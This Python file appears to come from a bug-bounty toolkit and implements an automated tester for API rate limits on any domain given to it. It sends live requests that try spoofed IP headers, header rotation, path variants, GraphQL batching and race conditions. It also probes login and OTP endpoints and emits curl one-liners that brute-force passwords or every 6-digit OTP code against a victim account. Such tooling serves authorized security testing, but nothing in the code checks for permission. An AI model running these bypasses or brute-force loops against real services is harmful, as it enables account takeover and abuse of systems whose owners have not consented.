"""
API Rate Limit Tester Agent

Comprehensive API rate limiting security testing agent that detects weak rate limits,
identifies bypass techniques, and exploits rate limit vulnerabilities. Tests IP rotation
bypass, header manipulation, endpoint variation, token bucket exhaustion, distributed
attacks, and GraphQL batching abuse.

Author: BountyHound Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import asyncio
import aiohttp
import time
import random
import hashlib
import statistics
import json
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from datetime import datetime, date
from enum import Enum
from engine.core.db_hooks import DatabaseHooks
from engine.core.payload_hooks import PayloadHooks
from engine.core.database import BountyHoundDB



class RateLimitSeverity(Enum):
    """Rate limit vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class RateLimitVulnType(Enum):
    """Types of rate limit vulnerabilities."""
    MISSING_RATE_LIMIT = "MISSING_RATE_LIMIT"
    IP_SPOOFING_BYPASS = "IP_SPOOFING_BYPASS"
    USER_AGENT_BYPASS = "USER_AGENT_BYPASS"
    ORIGIN_BYPASS = "ORIGIN_BYPASS"
    ENDPOINT_VARIATION_BYPASS = "ENDPOINT_VARIATION_BYPASS"
    SESSION_BYPASS = "SESSION_BYPASS"
    GRAPHQL_BATCH_BYPASS = "GRAPHQL_BATCH_BYPASS"
    GRAPHQL_ALIAS_BYPASS = "GRAPHQL_ALIAS_BYPASS"
    CREDENTIAL_BRUTE_FORCE = "CREDENTIAL_BRUTE_FORCE"
    OTP_BRUTE_FORCE = "OTP_BRUTE_FORCE"
    OTP_BRUTE_FORCE_IP_ROTATION = "OTP_BRUTE_FORCE_IP_ROTATION"
    RACE_CONDITION = "RACE_CONDITION"


@dataclass
class RateLimitProfile:
    """Profile of rate limiting behavior for an endpoint."""
    endpoint: str
    threshold: int
    window_seconds: int
    reset_behavior: str  # "sliding", "fixed", "token_bucket", "unknown"
    headers_present: bool
    bypass_vectors: List[str] = field(default_factory=list)
    rate_limit_headers: Dict[str, str] = field(default_factory=dict)


@dataclass
class RateLimitVulnerability:
    """Represents a rate limit vulnerability finding."""
    endpoint: str
    vuln_type: RateLimitVulnType
    severity: RateLimitSeverity
    description: str
    poc: str
    remediation: str
    bounty_estimate: str
    exploit_complexity: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    cwe_id: Optional[str] = None
    cvss_score: Optional[float] = None
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        data = asdict(self)
        data['severity'] = self.severity.value
        data['vuln_type'] = self.vuln_type.value
        return data


class ApiRateLimitTester:
    """
    Comprehensive API Rate Limit Tester.

    Performs extensive testing of API rate limiting including:
    - Rate limit detection and profiling
    - IP spoofing bypass (X-Forwarded-For, proxies)
    - Header manipulation (User-Agent, Origin)
    - Endpoint variation (/api/v1 vs /api/v2)
    - Token bucket exhaustion
    - Distributed attack simulation
    - GraphQL query batching/aliasing
    - Race conditions
    - Brute force feasibility (auth, OTP)

    Usage:
        async with ApiRateLimitTester("example.com") as tester:
            findings = await tester.run_full_scan(["/api/login", "/api/otp"])
    """

    # IP spoofing headers to test
    SPOOFING_HEADERS = [
        "X-Forwarded-For",
        "X-Real-IP",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Client-IP",
        "True-Client-IP",
        "CF-Connecting-IP",
        "X-Forwarded"
    ]

    # User-Agent strings for rotation
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36",
        "curl/7.68.0",
        "PostmanRuntime/7.29.0",
        "python-requests/2.26.0"
    ]

    def __init__(self, target_domain: str, api_key: Optional[str] = None,
                 timeout: int = 30, verify_ssl: bool = True):
        """
        Initialize the API Rate Limit Tester.

        Args:
            target_domain: Target domain to test
            api_key: Optional API key for authenticated endpoints
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
        """
        self.target_domain = target_domain
        self.api_key = api_key
        self.base_url = f"https://{target_domain}"
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session: Optional[aiohttp.ClientSession] = None
        self.findings: List[RateLimitVulnerability] = []
        self.profiles: Dict[str, RateLimitProfile] = {}
        self.db = BountyHoundDB()

    async def __aenter__(self):
        """Async context manager entry."""
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
        self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()

    async def run_full_scan(self, endpoints: List[str]) -> List[RateLimitVulnerability]:
        """
        Execute complete rate limit security scan.

        Args:
            endpoints: List of endpoints to test

        Returns:
            List of all findings discovered
        """
        # Database check before starting
        context = DatabaseHooks.before_test(self.target_domain, 'api_rate_limit_tester')

        print(f"[*] Database check: {context['reason']}")
        if context['should_skip']:
            print(f"[!] Recommendations:")
            for rec in context['recommendations']:
                print(f"    - {rec}")
            return []

        print(f"[*] Starting rate limit scan on {self.target_domain}")
        print(f"[*] Testing {len(endpoints)} endpoints")

        # Phase 1: Profile each endpoint
        for endpoint in endpoints:
            print(f"[*] Profiling {endpoint}")
            profile = await self.profile_rate_limit(endpoint)
            if profile:
                self.profiles[endpoint] = profile

        # Phase 2: Test bypass techniques
        for endpoint, profile in self.profiles.items():
            print(f"[*] Testing bypass techniques on {endpoint}")

            # IP spoofing bypass
            await self.test_ip_spoofing_bypass(endpoint, profile)

            # Header manipulation bypass
            await self.test_header_manipulation(endpoint, profile)

            # Endpoint variation bypass
            await self.test_endpoint_variations(endpoint, profile)

            # Session-based bypass
            await self.test_session_bypass(endpoint, profile)

            # Race condition
            await self.test_race_conditions(endpoint, profile)

            # GraphQL-specific tests
            if "graphql" in endpoint.lower():
                await self.test_graphql_batching(endpoint, profile)

        # Phase 3: Test critical endpoints for weak limits
        auth_endpoints = [e for e in endpoints if any(x in e.lower() for x in ["login", "auth", "otp", "verify", "password"])]
        for endpoint in auth_endpoints:
            await self.test_brute_force_feasibility(endpoint)

        # Record successful payloads
        for finding in self.findings:
            if finding.severity in [RateLimitSeverity.CRITICAL, RateLimitSeverity.HIGH]:
                # Record in payload learning system
                PayloadHooks.record_payload_success(
                    payload_text=finding.evidence.get('bypass_pattern', ''),
                    vuln_type=finding.vuln_type.value,
                    context=finding.endpoint,
                    notes=finding.description
                )

        return self.findings

    async def profile_rate_limit(self, endpoint: str) -> Optional[RateLimitProfile]:
        """
        Profile rate limiting behavior of an endpoint.

        Args:
            endpoint: Endpoint path to profile

        Returns:
            RateLimitProfile or None if profiling failed
        """
        url = f"{self.base_url}{endpoint}"
        headers = {}

        if self.api_key:
            headers["Authorization"] = f"Bearer {self.api_key}"

        # Send rapid requests to trigger rate limit
        request_times = []
        response_statuses = []
        rate_limit_headers = {}

        print(f"[*] Sending 50 requests to profile {endpoint}")

        for i in range(50):
            start = time.time()

            try:
                async with self.session.get(url, headers=headers) as resp:
                    elapsed = time.time() - start

                    request_times.append(elapsed)
                    response_statuses.append(resp.status)

                    # Capture rate limit headers
                    if resp.status == 429:
                        for header in resp.headers:
                            if "rate" in header.lower() or "limit" in header.lower() or "retry" in header.lower():
                                rate_limit_headers[header] = resp.headers[header]

                    # Small delay to avoid overwhelming
                    if i < 49:
                        await asyncio.sleep(0.1)

            except Exception as e:
                print(f"[-] Error profiling {endpoint}: {e}")
                continue

        # Analyze results
        rate_limited_count = sum(1 for s in response_statuses if s == 429)

        if rate_limited_count == 0:
            print(f"[!] No rate limiting detected on {endpoint} (50 requests)")
            self.findings.append(RateLimitVulnerability(
                endpoint=endpoint,
                vuln_type=RateLimitVulnType.MISSING_RATE_LIMIT,
                severity=RateLimitSeverity.HIGH,
                description=f"Endpoint accepts 50+ rapid requests without rate limiting",
                poc=f"for i in {{1..50}}; do curl {url}; done",
                remediation="Implement rate limiting (e.g., 100 req/min per IP)",
                bounty_estimate="$1000-$5000",
                exploit_complexity="Low",
                evidence={
                    'requests_sent': 50,
                    'rate_limited': 0,
                    'endpoint': endpoint
                },
                cwe_id="CWE-307",
                cvss_score=7.5
            ))
            return None

        # Calculate threshold
        threshold = 50 - rate_limited_count

        # Determine reset behavior
        reset_behavior = "unknown"
        if "X-RateLimit-Reset" in rate_limit_headers or "Retry-After" in rate_limit_headers:
            reset_behavior = "fixed"
        elif rate_limited_count > 0 and rate_limited_count < 50:
            reset_behavior = "sliding"

        profile = RateLimitProfile(
            endpoint=endpoint,
            threshold=threshold,
            window_seconds=60,  # Assume 1 minute window
            reset_behavior=reset_behavior,
            headers_present=len(rate_limit_headers) > 0,
            bypass_vectors=[],
            rate_limit_headers=rate_limit_headers
        )

        print(f"[+] Profile: threshold={threshold}, reset={reset_behavior}, headers={len(rate_limit_headers)}")

        return profile

    async def test_ip_spoofing_bypass(self, endpoint: str, profile: RateLimitProfile):
        """
        Test IP spoofing headers to bypass rate limits.

        Args:
            endpoint: Endpoint to test
            profile: Rate limit profile
        """
        url = f"{self.base_url}{endpoint}"

        for header_name in self.SPOOFING_HEADERS:
            success_count = 0
            test_requests = profile.threshold + 20

            for i in range(test_requests):
                fake_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

                headers = {header_name: fake_ip}
                if self.api_key:
                    headers["Authorization"] = f"Bearer {self.api_key}"

                try:
                    async with self.session.get(url, headers=headers) as resp:
                        if resp.status != 429:
                            success_count += 1

                    await asyncio.sleep(0.05)

                except Exception:
                    pass

            # If we got significantly more requests through, bypass works
            if success_count > profile.threshold + 10:
                self.findings.append(RateLimitVulnerability(
                    endpoint=endpoint,
                    vuln_type=RateLimitVulnType.IP_SPOOFING_BYPASS,
                    severity=RateLimitSeverity.HIGH,
                    description=f"Rate limit bypassed using {header_name} header ({success_count}/{test_requests} requests succeeded)",
                    poc=f"for i in {{1..100}}; do curl {url} -H '{header_name}: 1.2.3.$i'; done",
                    remediation=f"Don't trust {header_name} header. Use actual connection IP for rate limiting.",
                    bounty_estimate="$2000-$8000",
                    exploit_complexity="Low",
                    evidence={
                        'header_name': header_name,
                        'success_count': success_count,
                        'total_requests': test_requests,
                        'bypass_pattern': f'{header_name}: <random_ip>'
                    },
                    cwe_id="CWE-307",
                    cvss_score=7.8
                ))

                profile.bypass_vectors.append(f"IP spoofing via {header_name}")
                print(f"[+] Bypass found: {header_name}")
                break

    async def test_header_manipulation(self, endpoint: str, profile: RateLimitProfile):
        """
        Test various header manipulations to bypass rate limits.

        Args:
            endpoint: Endpoint to test
            profile: Rate limit profile
        """
        # Test 1: User-Agent rotation
        await self._test_user_agent_bypass(endpoint, profile)

        # Test 2: Origin header manipulation
        await self._test_origin_bypass(endpoint, profile)

    async def _test_user_agent_bypass(self, endpoint: str, profile: RateLimitProfile):
        """Test User-Agent rotation bypass."""
        url = f"{self.base_url}{endpoint}"

        success_count = 0
        test_requests = profile.threshold + 20

        for i in range(test_requests):
            ua = self.USER_AGENTS[i % len(self.USER_AGENTS)]
            headers = {"User-Agent": ua}

            if self.api_key:
                headers["Authorization"] = f"Bearer {self.api_key}"

            try:
                async with self.session.get(url, headers=headers) as resp:
                    if resp.status != 429:
                        success_count += 1

                await asyncio.sleep(0.05)
            except Exception:
                pass

        if success_count > profile.threshold + 10:
            self.findings.append(RateLimitVulnerability(
                endpoint=endpoint,
                vuln_type=RateLimitVulnType.USER_AGENT_BYPASS,
                severity=RateLimitSeverity.MEDIUM,
                description=f"Rate limit bypassed by rotating User-Agent header",
                poc=f"Rotate through {len(self.USER_AGENTS)} User-Agent strings",
                remediation="Don't use User-Agent for rate limiting. Use IP + session token.",
                bounty_estimate="$500-$2000",
                exploit_complexity="Low",
                evidence={
                    'user_agents': len(self.USER_AGENTS),
                    'success_count': success_count,
                    'total_requests': test_requests
                },
                cwe_id="CWE-307",
                cvss_score=5.3
            ))

            profile.bypass_vectors.append("User-Agent rotation")

    async def _test_origin_bypass(self, endpoint: str, profile: RateLimitProfile):
        """Test Origin header manipulation."""
        url = f"{self.base_url}{endpoint}"

        origins = [
            f"https://{self.target_domain}",
            f"https://www.{self.target_domain}",
            f"https://app.{self.target_domain}",
            f"https://mobile.{self.target_domain}",
            f"https://api.{self.target_domain}"
        ]

        success_count = 0
        test_requests = profile.threshold + 20

        for i in range(test_requests):
            origin = origins[i % len(origins)]
            headers = {"Origin": origin}

            if self.api_key:
                headers["Authorization"] = f"Bearer {self.api_key}"

            try:
                async with self.session.get(url, headers=headers) as resp:
                    if resp.status != 429:
                        success_count += 1

                await asyncio.sleep(0.05)
            except Exception:
                pass

        if success_count > profile.threshold + 10:
            self.findings.append(RateLimitVulnerability(
                endpoint=endpoint,
                vuln_type=RateLimitVulnType.ORIGIN_BYPASS,
                severity=RateLimitSeverity.MEDIUM,
                description=f"Rate limit bypassed by rotating Origin header",
                poc=f"Rotate through subdomains in Origin header",
                remediation="Origin header should not affect rate limiting",
                bounty_estimate="$500-$2000",
                exploit_complexity="Low",
                evidence={
                    'origins_used': origins,
                    'success_count': success_count,
                    'total_requests': test_requests
                },
                cwe_id="CWE-307",
                cvss_score=5.3
            ))

            profile.bypass_vectors.append("Origin rotation")

    async def test_endpoint_variations(self, endpoint: str, profile: RateLimitProfile):
        """
        Test endpoint path variations to bypass rate limits.

        Args:
            endpoint: Endpoint to test
            profile: Rate limit profile
        """
        # Generate variations
        variations = []

        # Version variations
        if "/v1/" in endpoint:
            variations.append(endpoint.replace("/v1/", "/v2/"))
            variations.append(endpoint.replace("/v1/", "/v3/"))
        if "/v2/" in endpoint:
            variations.append(endpoint.replace("/v2/", "/v1/"))
            variations.append(endpoint.replace("/v2/", "/v3/"))

        # Case variations
        if endpoint != endpoint.upper():
            variations.append(endpoint.upper())
        if endpoint != endpoint.lower():
            variations.append(endpoint.lower())

        # API prefix variations
        if endpoint.startswith("/api/"):
            variations.append(endpoint.replace("/api/", "/"))
            variations.append(endpoint.replace("/api/", "/mobile/"))
            variations.append(endpoint.replace("/api/", "/internal/"))

        # Trailing slash
        if endpoint.endswith("/"):
            variations.append(endpoint.rstrip("/"))
        else:
            variations.append(endpoint + "/")

        # Test each variation
        for variation in variations:
            if variation == endpoint:
                continue

            url = f"{self.base_url}{variation}"
            success_count = 0

            for i in range(profile.threshold + 20):
                headers = {}
                if self.api_key:
                    headers["Authorization"] = f"Bearer {self.api_key}"

                try:
                    async with self.session.get(url, headers=headers) as resp:
                        if resp.status not in [404, 429]:
                            success_count += 1

                    await asyncio.sleep(0.05)
                except Exception:
                    pass

            if success_count > profile.threshold + 10:
                self.findings.append(RateLimitVulnerability(
                    endpoint=endpoint,
                    vuln_type=RateLimitVulnType.ENDPOINT_VARIATION_BYPASS,
                    severity=RateLimitSeverity.MEDIUM,
                    description=f"Rate limit bypassed using endpoint variation: {variation}",
                    poc=f"curl {url} (variation of {endpoint})",
                    remediation="Apply consistent rate limiting across all endpoint variations",
                    bounty_estimate="$500-$3000",
                    exploit_complexity="Medium",
                    evidence={
                        'original_endpoint': endpoint,
                        'bypass_endpoint': variation,
                        'success_count': success_count
                    },
                    cwe_id="CWE-307",
                    cvss_score=5.3
                ))

                profile.bypass_vectors.append(f"Endpoint variation: {variation}")
                print(f"[+] Bypass via endpoint variation: {variation}")

    async def test_session_bypass(self, endpoint: str, profile: RateLimitProfile):
        """
        Test if rate limits are per-session or per-IP.

        Args:
            endpoint: Endpoint to test
            profile: Rate limit profile
        """
        url = f"{self.base_url}{endpoint}"

        # Create multiple sessions
        sessions_count = 5
        sessions = []

        for i in range(sessions_count):
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
            session = aiohttp.ClientSession(timeout=timeout, connector=connector)
            sessions.append(session)

        total_success = 0

        try:
            # Send requests from each session
            for session in sessions:
                for i in range(profile.threshold):
                    headers = {}
                    if self.api_key:
                        headers["Authorization"] = f"Bearer {self.api_key}"

                    try:
                        async with session.get(url, headers=headers) as resp:
                            if resp.status != 429:
                                total_success += 1

                        await asyncio.sleep(0.05)
                    except Exception:
                        pass

        finally:
            for session in sessions:
                await session.close()

        expected_max = profile.threshold
        actual = total_success

        if actual > expected_max * 3:  # Got 3x more requests through
            self.findings.append(RateLimitVulnerability(
                endpoint=endpoint,
                vuln_type=RateLimitVulnType.SESSION_BYPASS,
                severity=RateLimitSeverity.MEDIUM,
                description=f"Rate limit is per-session, not per-IP. {actual} requests succeeded using {sessions_count} sessions",
                poc=f"Create {sessions_count} sessions and distribute requests",
                remediation="Implement rate limiting per IP address, not just per session",
                bounty_estimate="$500-$2000",
                exploit_complexity="Medium",
                evidence={
                    'sessions_used': sessions_count,
                    'total_success': actual,
                    'expected_max': expected_max
                },
                cwe_id="CWE-307",
                cvss_score=5.3
            ))

            profile.bypass_vectors.append("Session multiplication")

    async def test_graphql_batching(self, endpoint: str, profile: RateLimitProfile):
        """
        Test GraphQL query batching to bypass rate limits.

        Args:
            endpoint: GraphQL endpoint to test
            profile: Rate limit profile
        """
        url = f"{self.base_url}{endpoint}"

        # Test 1: Array batching
        queries = []
        for i in range(20):
            queries.append({
                "query": "query { __typename }",
                "variables": {}
            })

        headers = {"Content-Type": "application/json"}
        if self.api_key:
            headers["Authorization"] = f"Bearer {self.api_key}"

        try:
            async with self.session.post(url, json=queries, headers=headers) as resp:
                body = await resp.text()

                # If we get results for all 20 queries but single query is rate limited
                if resp.status == 200 and "__typename" in body:
                    # Verify single query gets rate limited
                    rate_limited = False

                    for i in range(profile.threshold + 5):
                        async with self.session.post(
                            url,
                            json={"query": "query { __typename }"},
                            headers=headers
                        ) as single_resp:
                            if single_resp.status == 429:
                                rate_limited = True
                                break

                        await asyncio.sleep(0.05)

                    if rate_limited:
                        self.findings.append(RateLimitVulnerability(
                            endpoint=endpoint,
                            vuln_type=RateLimitVulnType.GRAPHQL_BATCH_BYPASS,
                            severity=RateLimitSeverity.HIGH,
                            description="Rate limit counts batched queries as single request",
                            poc=f"POST {url} with array of 20 queries: [{queries[0]}, ...]",
                            remediation="Count each query in batch towards rate limit",
                            bounty_estimate="$1000-$5000",
                            exploit_complexity="Low",
                            evidence={
                                'batch_size': len(queries),
                                'single_query_rate_limited': True
                            },
                            cwe_id="CWE-307",
                            cvss_score=7.1
                        ))

                        profile.bypass_vectors.append("GraphQL batching")

        except Exception:
            pass

        # Test 2: Alias-based multiplication
        await self._test_graphql_aliases(endpoint, profile)

    async def _test_graphql_aliases(self, endpoint: str, profile: RateLimitProfile):
        """Test GraphQL alias-based query multiplication."""
        url = f"{self.base_url}{endpoint}"

        # Create query with 20 aliases
        aliases = []
        for i in range(20):
            aliases.append(f"alias{i}: __typename")

        query = "query { " + " ".join(aliases) + " }"

        headers = {"Content-Type": "application/json"}
        if self.api_key:
            headers["Authorization"] = f"Bearer {self.api_key}"

        try:
            async with self.session.post(
                url,
                json={"query": query},
                headers=headers
            ) as resp:
                if resp.status == 200:
                    body = await resp.text()

                    # Check if all aliases returned
                    success_count = sum(1 for i in range(20) if f"alias{i}" in body)

                    if success_count >= 15:  # At least 15 aliases worked
                        self.findings.append(RateLimitVulnerability(
                            endpoint=endpoint,
                            vuln_type=RateLimitVulnType.GRAPHQL_ALIAS_BYPASS,
                            severity=RateLimitSeverity.MEDIUM,
                            description=f"Single query with {success_count} aliases bypasses rate limiting",
                            poc=f"POST {url} with query containing {success_count} aliases",
                            remediation="Count query complexity, not just request count. Limit aliases per query.",
                            bounty_estimate="$800-$3000",
                            exploit_complexity="Medium",
                            evidence={
                                'aliases_count': success_count,
                                'query_preview': query[:200]
                            },
                            cwe_id="CWE-307",
                            cvss_score=5.3
                        ))

                        profile.bypass_vectors.append("GraphQL aliases")

        except Exception:
            pass

    async def test_brute_force_feasibility(self, endpoint: str):
        """
        Test if authentication endpoints have weak rate limits.

        Args:
            endpoint: Endpoint to test
        """
        # Determine endpoint type
        is_login = any(x in endpoint.lower() for x in ["login", "signin", "auth"])
        is_otp = any(x in endpoint.lower() for x in ["otp", "verify", "code", "2fa"])

        if is_login:
            await self._test_login_brute_force(endpoint)
        elif is_otp:
            await self._test_otp_brute_force(endpoint)

    async def _test_login_brute_force(self, endpoint: str):
        """Test credential brute force feasibility."""
        url = f"{self.base_url}{endpoint}"

        # Test with common credentials
        test_attempts = 50
        success_count = 0

        for i in range(test_attempts):
            payload = {
                "username": f"test{i}@example.com",
                "password": "Password123!"
            }

            try:
                async with self.session.post(url, json=payload) as resp:
                    if resp.status != 429:
                        success_count += 1

                await asyncio.sleep(0.1)

            except Exception:
                pass

        if success_count >= 40:  # 80%+ success rate
            # Calculate brute force time
            passwords_to_test = 10000  # Common password list
            time_per_request = 0.1  # seconds
            total_time = (passwords_to_test * time_per_request) / 60  # minutes

            severity = RateLimitSeverity.CRITICAL if success_count >= 50 else RateLimitSeverity.HIGH

            self.findings.append(RateLimitVulnerability(
                endpoint=endpoint,
                vuln_type=RateLimitVulnType.CREDENTIAL_BRUTE_FORCE,
                severity=severity,
                description=f"Login endpoint accepts {success_count}/{test_attempts} rapid attempts. Brute force of 10K passwords feasible in {total_time:.1f} minutes",
                poc=f"for pwd in $(cat passwords.txt); do curl {url} -d '{{\"username\":\"victim@example.com\",\"password\":\"'$pwd'\"}}'; done",
                remediation="Implement strict rate limiting (e.g., 5 attempts per 15 minutes). Add CAPTCHA after failed attempts.",
                bounty_estimate="$3000-$8000",
                exploit_complexity="Low",
                evidence={
                    'success_count': success_count,
                    'test_attempts': test_attempts,
                    'estimated_brute_force_time_minutes': total_time
                },
                cwe_id="CWE-307",
                cvss_score=9.1
            ))

    async def _test_otp_brute_force(self, endpoint: str):
        """Test OTP/2FA brute force feasibility."""
        url = f"{self.base_url}{endpoint}"

        # Test with random OTP codes
        test_attempts = 100
        success_count = 0

        for i in range(test_attempts):
            code = f"{random.randint(0, 999999):06d}"
            payload = {
                "code": code,
                "phone": "+1234567890"
            }

            try:
                async with self.session.post(url, json=payload) as resp:
                    if resp.status != 429:
                        success_count += 1

                await asyncio.sleep(0.05)

            except Exception:
                pass

        if success_count >= 80:  # 80%+ success rate
            # Calculate brute force time for 6-digit OTP
            possible_codes = 1000000
            time_per_request = 0.05  # seconds
            total_time = (possible_codes * time_per_request) / 3600  # hours

            # But realistically, average is 500K tries
            avg_time = total_time / 2

            self.findings.append(RateLimitVulnerability(
                endpoint=endpoint,
                vuln_type=RateLimitVulnType.OTP_BRUTE_FORCE,
                severity=RateLimitSeverity.CRITICAL,
                description=f"OTP endpoint accepts {success_count}/{test_attempts} rapid attempts. 6-digit OTP brute force feasible in {avg_time:.1f} hours (average case)",
                poc=f"for code in $(seq -w 0 999999); do curl {url} -d '{{\"code\":\"'$code'\",\"phone\":\"+1234567890\"}}'; done",
                remediation="Implement strict rate limiting (e.g., 5 attempts per OTP session). Lock account after 10 failed attempts. Use longer codes or TOTP.",
                bounty_estimate="$5000-$8000",
                exploit_complexity="Low",
                evidence={
                    'success_count': success_count,
                    'test_attempts': test_attempts,
                    'estimated_crack_time_hours': avg_time
                },
                cwe_id="CWE-307",
                cvss_score=9.8
            ))

        elif success_count >= 20:  # 20-80% success rate
            # Still exploitable with IP rotation
            self.findings.append(RateLimitVulnerability(
                endpoint=endpoint,
                vuln_type=RateLimitVulnType.OTP_BRUTE_FORCE_IP_ROTATION,
                severity=RateLimitSeverity.HIGH,
                description=f"OTP endpoint has weak rate limiting ({success_count}/{test_attempts} attempts). Brute force feasible with IP rotation.",
                poc=f"Distribute brute force across multiple IPs",
                remediation="Implement account-based rate limiting, not just IP-based. Lock account after failures.",
                bounty_estimate="$2000-$5000",
                exploit_complexity="Medium",
                evidence={
                    'success_count': success_count,
                    'test_attempts': test_attempts
                },
                cwe_id="CWE-307",
                cvss_score=7.1
            ))

    async def test_race_conditions(self, endpoint: str, profile: RateLimitProfile):
        """
        Test race conditions in rate limit implementation.

        Args:
            endpoint: Endpoint to test
            profile: Rate limit profile
        """
        url = f"{self.base_url}{endpoint}"

        # Send simultaneous requests
        concurrent_requests = 20
        tasks = []

        headers = {}
        if self.api_key:
            headers["Authorization"] = f"Bearer {self.api_key}"

        async def make_request():
            try:
                async with self.session.get(url, headers=headers) as resp:
                    return resp
            except Exception:
                return None

        # Execute all at once
        tasks = [make_request() for _ in range(concurrent_requests)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        success_count = 0
        for result in results:
            if result and hasattr(result, 'status') and result.status not in [429, 500]:
                success_count += 1
                try:
                    await result.read()
                except Exception:
                    pass

        # If we got more successes than the threshold, race condition exists
        if success_count > profile.threshold * 1.5:
            self.findings.append(RateLimitVulnerability(
                endpoint=endpoint,
                vuln_type=RateLimitVulnType.RACE_CONDITION,
                severity=RateLimitSeverity.MEDIUM,
                description=f"Race condition allows {success_count} concurrent requests vs {profile.threshold} limit",
                poc=f"Send {concurrent_requests} simultaneous requests to {url}",
                remediation="Use atomic operations for rate limit counter. Implement proper locking.",
                bounty_estimate="$800-$3000",
                exploit_complexity="Medium",
                evidence={
                    'concurrent_requests': concurrent_requests,
                    'success_count': success_count,
                    'expected_threshold': profile.threshold
                },
                cwe_id="CWE-362",
                cvss_score=5.3
            ))

            profile.bypass_vectors.append("Race condition")

    def get_summary(self) -> Dict[str, Any]:
        """
        Generate summary of test results.

        Returns:
            Dictionary with test statistics and findings
        """
        severity_counts = {
            'CRITICAL': len([f for f in self.findings if f.severity == RateLimitSeverity.CRITICAL]),
            'HIGH': len([f for f in self.findings if f.severity == RateLimitSeverity.HIGH]),
            'MEDIUM': len([f for f in self.findings if f.severity == RateLimitSeverity.MEDIUM]),
            'LOW': len([f for f in self.findings if f.severity == RateLimitSeverity.LOW]),
            'INFO': len([f for f in self.findings if f.severity == RateLimitSeverity.INFO])
        }

        return {
            'target': self.target_domain,
            'total_findings': len(self.findings),
            'severity_breakdown': severity_counts,
            'vulnerable': len(self.findings) > 0,
            'critical_count': severity_counts['CRITICAL'],
            'findings': [f.to_dict() for f in self.findings],
            'endpoints_tested': list(self.profiles.keys())
        }


async def main():
    """CLI entry point for standalone testing."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python api_rate_limit_tester.py <domain> [api_key]")
        sys.exit(1)

    domain = sys.argv[1]
    api_key = sys.argv[2] if len(sys.argv) > 2 else None

    # Common API endpoints to test
    test_endpoints = [
        "/api/login",
        "/api/auth/login",
        "/api/v1/auth/login",
        "/api/verify",
        "/api/otp/verify",
        "/api/users",
        "/api/v1/users",
        "/graphql",
        "/api/graphql",
        "/api/search",
        "/api/password/reset"
    ]

    async with ApiRateLimitTester(domain, api_key) as tester:
        findings = await tester.run_full_scan(test_endpoints)

        print(f"\n{'='*80}")
        print(f"RATE LIMIT SECURITY SCAN RESULTS: {domain}")
        print(f"{'='*80}\n")

        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        findings.sort(key=lambda x: severity_order.get(x.severity.value, 5))

        for i, finding in enumerate(findings, 1):
            print(f"[{i}] {finding.severity.value} - {finding.vuln_type.value}")
            print(f"    Endpoint: {finding.endpoint}")
            print(f"    Description: {finding.description}")
            print(f"    Bounty Estimate: {finding.bounty_estimate}")
            print(f"    Exploit Complexity: {finding.exploit_complexity}")
            print(f"    POC: {finding.poc[:100]}...")
            print()

        print(f"Total findings: {len(findings)}")

        summary = tester.get_summary()
        print(f"Critical: {summary['severity_breakdown']['CRITICAL']}, "
              f"High: {summary['severity_breakdown']['HIGH']}, "
              f"Medium: {summary['severity_breakdown']['MEDIUM']}, "
              f"Low: {summary['severity_breakdown']['LOW']}")


if __name__ == "__main__":
    asyncio.run(main())
